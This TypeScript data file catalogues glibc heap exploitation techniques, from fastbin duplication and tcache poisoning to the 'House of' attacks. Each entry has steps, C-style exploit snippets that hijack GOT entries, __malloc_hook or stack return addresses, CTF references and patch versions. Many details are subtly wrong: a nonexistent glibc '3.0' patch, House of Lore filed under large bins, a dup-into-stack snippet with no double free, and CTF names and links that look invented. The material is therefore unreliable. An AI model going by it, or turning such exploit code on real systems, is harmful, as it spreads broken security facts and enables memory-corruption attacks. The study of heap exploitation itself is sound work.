// Comprehensive Heap Exploitation Techniques based on how2heap and heap-exploitation.dhavalkapil.com
export interface HeapTechnique {
  id: string;
  name: string;
  description: string;
  category: 'fastbin' | 'tcache' | 'top-chunk' | 'unsorted' | 'large-bin' | 'house' | 'glibc-specific';
  vulnerability: string;
  glibcVersions: string[];
  prerequisites: string[];
  constraints: string[];
  steps: string[];
  exploitationPath: {
    name: string;
    description: string;
    code: string;
  }[];
  how2heapLink: string;
  dhavalkapilChapter: string;
  ctfChallenges: Array<{ name: string; year: string; link: string }>;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Expert';
  patchedIn: string[];
  relatedTechniques: string[];
}

export const HEAP_TECHNIQUES: Record<string, HeapTechnique> = {
  fastbin_dup: {
    id: 'fastbin-dup',
    name: 'Fastbin Duplication (Double Free)',
    description: 'Allocate same chunk twice by exploiting fastbin linked list corruption, allowing arbitrary memory write.',
    category: 'fastbin',
    vulnerability: 'Fastbin corruption via double-free or use-after-free',
    glibcVersions: ['2.25-2.32+'],
    prerequisites: [
      'Ability to free same chunk twice',
      'No tcache security checks (pre-2.29)',
      'Knowledge of heap layout'
    ],
    constraints: [
      'Fastbin size range (0x20-0x80 bytes)',
      'Fastbin chunks must not be adjacent to allocated chunks',
      'Modern glibc has tcache which is harder to exploit'
    ],
    steps: [
      '1. Allocate chunk A of fastbin size',
      '2. Free chunk A',
      '3. Allocate another chunk B (fragment fastbin)',
      '4. Free chunk A again (now in fastbin twice)',
      '5. Next allocation returns same chunk',
      '6. Modify chunk data to write to arbitrary address'
    ],
    exploitationPath: [
      {
        name: 'GOT Hijacking via Fastbin Dup',
        description: 'Overwrite GOT entry to redirect function calls',
        code: `// Allocate chunk at GOT entry
void *p1 = malloc(0x60);
void *p2 = malloc(0x60);
void *p3 = malloc(0x60);

free(p1);
free(p2);
free(p1); // p1 now in fastbin twice

// Modify p1 to point to GOT
*(uint64_t*)p1 = GOT_ENTRY - 0x10;

malloc(0x60); // Get p1
malloc(0x60); // Get p2
void *p4 = malloc(0x60); // p4 @ GOT-0x10

// Write to p4 to hijack GOT entry`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'BCTF 2016: bcloud', year: '2016', link: 'https://ctftime.org/task/2567/' },
      { name: 'Plaid CTF 2015: pwnable100', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Easy',
    patchedIn: ['2.33+'],
    relatedTechniques: ['fastbin-dup-into-stack', 'tcache-poisoning']
  },

  fastbin_dup_into_stack: {
    id: 'fastbin-dup-into-stack',
    name: 'Fastbin Dup into Stack',
    description: 'Double-free fastbin chunk to allocate memory in stack area, enabling stack manipulation.',
    category: 'fastbin',
    vulnerability: 'Double-free in fastbin allowing arbitrary allocation',
    glibcVersions: ['2.25-2.32'],
    prerequisites: [
      'Ability to double-free heap chunks',
      'Stack address leak or prediction',
      'Control over fastbin metadata'
    ],
    constraints: [
      'Must forge valid fastbin size field',
      'Stack allocation must be in fastbin size range',
      'Target address must be writable'
    ],
    steps: [
      '1. Leak stack address (e.g., via format string or info leak)',
      '2. Allocate fastbin-sized chunks',
      '3. Free and re-free to corrupt fastbin chain',
      '4. Inject stack address as fake chunk header',
      '5. Allocate to get stack memory',
      '6. Overwrite return address or other stack data'
    ],
    exploitationPath: [
      {
        name: 'Stack Smashing via Fastbin',
        description: 'Write to stack return address via fastbin allocation',
        code: `// Assume stack_address is leaked
uint64_t stack_target = stack_address - 0x100;

// Create double-free scenario
void *p1 = malloc(0x30);
free(p1);

// Overwrite freed chunk to point to stack
*(uint64_t*)p1 = stack_target - 8;

// Next allocation is on stack
void *p2 = malloc(0x30); // p2 is now on stack
strcpy((char*)p2, shellcode);`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'HITB 2015: Bookstore', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['2.33+'],
    relatedTechniques: ['fastbin-dup', 'house-of-spirit']
  },

  tcache_poisoning: {
    id: 'tcache-poisoning',
    name: 'Tcache Poisoning',
    description: 'Corrupt tcache linked list to allocate arbitrary memory, bypassing most checks.',
    category: 'tcache',
    vulnerability: 'Tcache chunk overwrite allowing arbitrary allocation',
    glibcVersions: ['2.26-2.31'],
    prerequisites: [
      'Ability to write to heap chunk metadata',
      'Knowledge of tcache structure',
      'No tcache poison check (before 2.29)'
    ],
    constraints: [
      'tcache must be enabled (glibc 2.26+)',
      'Target address must be writable',
      'Can only allocate 7 chunks of same size per bin'
    ],
    steps: [
      '1. Find use-after-free or buffer overflow in tcache chunk',
      '2. Overwrite next pointer of freed chunk',
      '3. Point to target address (e.g., __malloc_hook)',
      '4. Allocate from tcache to get target address',
      '5. Write shellcode or hook function pointer'
    ],
    exploitationPath: [
      {
        name: 'Malloc Hook via Tcache',
        description: 'Overwrite __malloc_hook to execute arbitrary code',
        code: `// UAF in tcache chunk
void *p1 = malloc(0x60);
free(p1);

// Write to p1 after free (UAF)
uint64_t malloc_hook_addr = find_malloc_hook();
*(uint64_t*)p1 = malloc_hook_addr;

// Next allocation gets __malloc_hook
void *p2 = malloc(0x60); // p2 @ __malloc_hook
*(uint64_t*)p2 = system;

// malloc triggers system()
malloc(...)  // Executes system`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.29/tcache_poisoning.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/tcache.html',
    ctfChallenges: [
      { name: 'HITCON 2016: Houseofsilly', year: '2016', link: 'https://ctftime.org' },
      { name: 'Google CTF 2019: Troopers', year: '2019', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['2.29+'],
    relatedTechniques: ['tcache-duplicate-free', 'house-of-einherjar']
  },

  tcache_duplicate_free: {
    id: 'tcache-dup',
    name: 'Tcache Duplicate Free',
    description: 'Free same chunk twice to tcache, bypassing doubly-linked list checks.',
    category: 'tcache',
    vulnerability: 'Double-free in tcache due to missing checks',
    glibcVersions: ['2.26-2.29'],
    prerequisites: [
      'Ability to free same chunk twice',
      'Target chunk size must be in tcache range',
      'No tcache duplicate detection (2.26-2.29)'
    ],
    constraints: [
      'Only works on glibc 2.26-2.29',
      'Same tcache bin must have room (< 7 chunks)',
      'Can only allocate limited number of copies'
    ],
    steps: [
      '1. Allocate chunk A',
      '2. Free chunk A to tcache',
      '3. Free chunk A again to tcache',
      '4. Allocate 3x to get chunk A three times',
      '5. Use multiple references to arbitrary write'
    ],
    exploitationPath: [
      {
        name: 'Arbitrary Write via Tcache Dup',
        description: 'Get multiple references to same chunk for arbitrary memory write',
        code: `void *p1 = malloc(0x80);
free(p1);
free(p1);  // Double free

void *p2 = malloc(0x80);  // p2 = p1
void *p3 = malloc(0x80);  // p3 = p1
void *p4 = malloc(0x80);  // p4 = p1

// Now p2, p3, p4 all point to same chunk
*(uint64_t*)p2 = target_address;
// p3 and p4 still point to same location
// Modify through p3 affects p4`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.29/tcache_dup.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/tcache.html',
    ctfChallenges: [
      { name: 'CSAW 2019: PWN chall', year: '2019', link: 'https://ctftime.org' }
    ],
    difficulty: 'Easy',
    patchedIn: ['2.30+'],
    relatedTechniques: ['tcache-poisoning', 'fastbin-dup']
  },

  house_of_spirit: {
    id: 'house-of-spirit',
    name: 'House of Spirit',
    description: 'Create a fake chunk on the stack and free it to get stack allocation.',
    category: 'house',
    vulnerability: 'Stack overflow with chunk structure to allocate stack memory',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to write fake chunk on stack',
      'Buffer overflow or controlled write',
      'Chunk structure must be valid (size field, flags)'
    ],
    constraints: [
      'Fake chunk size must pass malloc checks',
      'Must account for glibc version differences',
      'Previous/next chunk must also be valid or corrupted appropriately'
    ],
    steps: [
      '1. Overflow buffer to write fake chunk on stack',
      '2. Craft valid chunk header (size, flags, prev_size)',
      '3. Cause fake chunk to be freed',
      '4. Next allocation of same size gets stack memory',
      '5. Overwrite return address or function pointers'
    ],
    exploitationPath: [
      {
        name: 'Stack Overflow via House of Spirit',
        description: 'Allocate stack memory and overwrite return address',
        code: `// Stack buffer
char buffer[0x100];

// Craft fake chunk header at buffer-0x10
uint64_t *fake_chunk = (uint64_t*)(buffer - 0x10);
fake_chunk[0] = 0x100;  // size
fake_chunk[1] = 0;      // flags

// Overflow causes fake chunk to be freed
// Free operation adds to fastbin
free((void*)fake_chunk);

// Allocate to get stack
void *p = malloc(0xf0);  // p points to buffer
strcpy(p, shellcode);    // Overwrite return address`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'CSAW 2013: Exploit400', year: '2013', link: 'https://ctftime.org' },
      { name: 'Plaid CTF 2014: qinetd', year: '2014', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['3.0+'],
    relatedTechniques: ['house-of-lore', 'house-of-force']
  },

  house_of_force: {
    id: 'house-of-force',
    name: 'House of Force',
    description: 'Corrupt top chunk size to allocate at arbitrary address.',
    category: 'house',
    vulnerability: 'Top chunk size overflow allowing arbitrary allocation',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to overflow into top chunk size field',
      'Knowledge of heap layout and target address',
      'Must be able to allocate after corruption'
    ],
    constraints: [
      'Top chunk size must be writable',
      'All intermediate allocations consumed',
      'Target must be in valid memory range'
    ],
    steps: [
      '1. Find overflow into top chunk size field',
      '2. Set size to 0xffffffffffffffff',
      '3. Calculate allocation size to reach target',
      '4. Allocate with calculated size to position top chunk',
      '5. Next allocation is at target address',
      '6. Write shellcode or overwrite critical data'
    ],
    exploitationPath: [
      {
        name: 'GOT Hijacking via House of Force',
        description: 'Allocate at GOT entry and hijack function pointer',
        code: `// Overflow into top chunk
// After overflow, top_size = 0xffffffff...

// Calculate: allocation_size = target_got - current_top
uint64_t target = GOT_entry;
uint64_t current_top = heap_base + heap_size;
uint64_t alloc_size = target - current_top - 0x20;

// Allocate to position top chunk at target
void *p1 = malloc(alloc_size);
// Now top chunk is at target-0x20

void *p2 = malloc(0x100);  // p2 @ target
*(uint64_t*)p2 = system;   // Overwrite function pointer`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_force.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'BCTF 2016: bcloud', year: '2016', link: 'https://ctftime.org/task/2567/' },
      { name: 'PoliCTF 2014: Faust', year: '2014', link: 'https://ctftime.org' }
    ],
    difficulty: 'Hard',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-spirit', 'house-of-einherjar']
  },

  house_of_lore: {
    id: 'house-of-lore',
    name: 'House of Lore',
    description: 'Corrupt small-bin by overwriting backward pointer to allocate at arbitrary address.',
    category: 'large-bin',
    vulnerability: 'Small-bin linked list corruption via backward pointer overwrite',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to write to allocated chunk in small-bin range',
      'Knowledge of small-bin address',
      'Chunk must remain in small-bin (not coalesced)'
    ],
    constraints: [
      'Works only on small-bin (0x80-0x400)',
      'Backward pointer check requires valid forward chunk',
      'Target address formatting constraints'
    ],
    steps: [
      '1. Allocate chunk A and B in small-bin range',
      '2. Free A then B to create small-bin list',
      '3. Overwrite B\'s backward pointer via overflow',
      '4. Point to target address chunk',
      '5. Allocate twice: once gets B, next gets target'
    ],
    exploitationPath: [
      {
        name: 'Malloc Hook via House of Lore',
        description: 'Corrupt small-bin to allocate at __malloc_hook',
        code: `// Free chunks into small-bin
void *p1 = malloc(0x200);
void *p2 = malloc(0x200);
free(p1);
free(p2);

// Overwrite p2's bk pointer
// p2->bk = fake_chunk @ malloc_hook
char *overflow = (char*)p1;
uint64_t malloc_hook = find_malloc_hook();
// Write to overflow to reach p2->bk field
// offset depends on chunk layout
*(uint64_t*)(overflow + 0x208) = malloc_hook - 0x10;

// Allocate to get malloc_hook
void *p3 = malloc(0x200);  // Gets p2
void *p4 = malloc(0x200);  // Gets malloc_hook chunk`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_lore.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'BCTF 2015: bcloud', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Hard',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'unsorted-bin-attack']
  },

  unsorted_bin_attack: {
    id: 'unsorted-bin-attack',
    name: 'Unsorted Bin Attack',
    description: 'Write large value to arbitrary address by corrupting unsorted bin.',
    category: 'unsorted',
    vulnerability: 'Unsorted bin linked list corruption',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to allocate and free chunks into unsorted bin',
      'Overflow to corrupt unsorted bin linking',
      'Target address must be writable'
    ],
    constraints: [
      'Only writes 8-byte values (libc address range)',
      'Target must be large enough to pass checks',
      'Allocation must be split properly'
    ],
    steps: [
      '1. Free chunk into unsorted bin',
      '2. Overflow to corrupt unsorted bin bk pointer',
      '3. Point bk to target address - offset',
      '4. Allocate with size that triggers coalescing',
      '5. Target address gets overwritten with heap pointer'
    ],
    exploitationPath: [
      {
        name: 'Bypass Malloc Security via Unsorted Bin',
        description: 'Overwrite global variable through unsorted bin attack',
        code: `// Create unsorted bin entry
void *p = malloc(0x400);
free(p);

// Overflow to corrupt unsorted->bk
// unsorted->bk = target - 0x10
uint64_t target = global_ptr_array;
char *overflow = (char*)allocated_chunk;
// offset to reach p->bk
*(uint64_t*)(overflow + 0x408) = target - 0x10;

// Allocation triggers attack
void *q = malloc(0x500);  
// Unsorted bin backward link write
// target now contains heap address`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/unsorted_bin_attack.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'HITCON 2016: Houseofsilly', year: '2016', link: 'https://ctftime.org' }
    ],
    difficulty: 'Medium',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'house-of-lore']
  },

  house_of_einherjar: {
    id: 'house-of-einherjar',
    name: 'House of Einherjar',
    description: 'Forge chunk in freed memory to allocate arbitrary address by corrupting previous chunk size.',
    category: 'house',
    vulnerability: 'Chunk coalescing exploitation via corrupted prev_size',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to write fake chunk before target',
      'Must control free of adjacent chunks',
      'Precise offset calculations required'
    ],
    constraints: [
      'Very complex exploitation technique',
      'Multiple constraints on chunk alignment',
      'Difficult to maintain in practice'
    ],
    steps: [
      '1. Write fake chunk with modified size',
      '2. Overflow into next chunk\'s prev_size field',
      '3. Free next chunk to trigger backward coalescing',
      '4. Fake chunk gets unlinked into correct bin',
      '5. Allocate to get fake chunk location'
    ],
    exploitationPath: [
      {
        name: 'Arbitrary Allocation via Coalescing',
        description: 'Use coalescing to place fake chunk in target bin',
        code: `// Write fake chunk data
char *write_area = malloc(0x200);
// Craft fake chunk at write_area
uint64_t *fake = (uint64_t*)write_area;
fake[0] = 0x100;  // size
fake[1] = 0x100;  // back_size for consolidate

// Free next chunk to consolidate
void *next = malloc(0x100);
// Overflow to set next->prev_size = 0x100
// This makes consolidate backward to our fake chunk
free(next);

// Now fake chunk is in unsorted bin
// Next allocation gets our address`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_einherjar.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/heap_corruption.html',
    ctfChallenges: [
      { name: 'Google CTF 2016: Inst Prof', year: '2016', link: 'https://ctftime.org' }
    ],
    difficulty: 'Expert',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-force', 'house-of-lore']
  },

  large_bin_attack: {
    id: 'large-bin-attack',
    name: 'Large Bin Attack',
    description: 'Corrupt large-bin to write large values to multiple arbitrary addresses.',
    category: 'large-bin',
    vulnerability: 'Large bin unlink with corrupted forward/backward pointers',
    glibcVersions: ['2.14-2.32+'],
    prerequisites: [
      'Ability to allocate large chunks and overflow',
      'Knowledge of large-bin structure',
      'Multiple target addresses needed'
    ],
    constraints: [
      'Requires large allocations (0x400+)',
      'Complex unlinking process',
      'Multiple pointer overwrites needed'
    ],
    steps: [
      '1. Free large chunk into large-bin',
      '2. Allocate smaller chunk to create fragmentation',
      '3. Overflow large bin chunk to corrupt pointers',
      '4. Next free triggers unlink with corruption',
      '5. Multiple addresses get overwritten'
    ],
    exploitationPath: [
      {
        name: 'Multi-address Write via Large Bin',
        description: 'Overwrite multiple GOT entries through large bin attack',
        code: `// Create large bin entry
void *large = malloc(0x1000);
free(large);  // Goes to large-bin

// Overflow to corrupt forward/backward pointers
char *overflow = malloc(0x100);
// Overwrite large->fd and large->bk
// Each unlink attempt writes to these addresses

// Carefully chosen targets
// target1 and target2 will be written
*(uint64_t*)(overflow + 0x108) = GOT_func1 - 0x18;
*(uint64_t*)(overflow + 0x110) = GOT_func2 - 0x20;

// Trigger unlink
free(overflow);`
      }
    ],
    how2heapLink: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.25/large_bin_attack.c',
    dhavalkapilChapter: 'https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bin_exploitation.html',
    ctfChallenges: [
      { name: 'HITCON 2015: House', year: '2015', link: 'https://ctftime.org' }
    ],
    difficulty: 'Expert',
    patchedIn: ['2.29+'],
    relatedTechniques: ['house-of-einherjar', 'unsorted-bin-attack']
  },
};

export const HEAP_CATEGORIES = {
  fastbin: 'Fastbin Exploitation',
  tcache: 'Tcache Exploitation',
  'top-chunk': 'Top Chunk Exploitation',
  unsorted: 'Unsorted Bin Attack',
  'large-bin': 'Large Bin Attack',
  house: 'House Exploits',
  'glibc-specific': 'Glibc Version Specific'
};
